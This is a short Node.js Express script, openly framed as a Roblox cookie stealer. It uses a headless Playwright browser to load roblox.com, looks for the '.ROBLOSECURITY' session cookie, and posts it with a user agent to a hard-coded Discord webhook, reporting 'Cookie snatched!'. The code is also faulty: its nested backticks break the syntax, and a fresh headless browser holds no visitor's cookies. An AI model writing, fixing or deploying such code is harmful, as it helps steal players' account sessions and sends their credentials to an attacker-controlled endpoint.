const express = require('express');
const { chromium } = require('playwright');
const app = express();
const PORT = process.env.PORT || 3000;

// REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1559507908339830915/1rF2lKbnmwqnLsaBoP5L88G2TxFMZBwwTUT4gYlKM47GCSTNQnqudCkhx5rFnJyG-iSP";

app.get('/', async (req, res) => {
    console.log("New visitor detected!");
    let browser;
    try {
        browser = await chromium.launch({ headless: true });
        const context = await browser.newContext();
        const page = await context.newPage();
       
        await page.goto('https://roblox.com', { waitUntil: 'networkidle' });
        await page.waitForTimeout(5000); // Give Roblox time to set cookies
       
        const cookies = await context.cookies();
        const robloCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
       
        if (robloCookie) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🎣 **Cookie Snatched!** User Agent: `${page.evaluate(() => navigator.userAgent)}` Cookie: `${robloCookie.value}``
                })
            });
            res.send(`✅ Cookie stolen!`);
        } else {
            res.send(`❌ No cookie found.`);
        }
    } catch (error) {
        res.send(`❌ Error: ${error.message}`);
    } finally {
        if (browser) await browser.close();
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
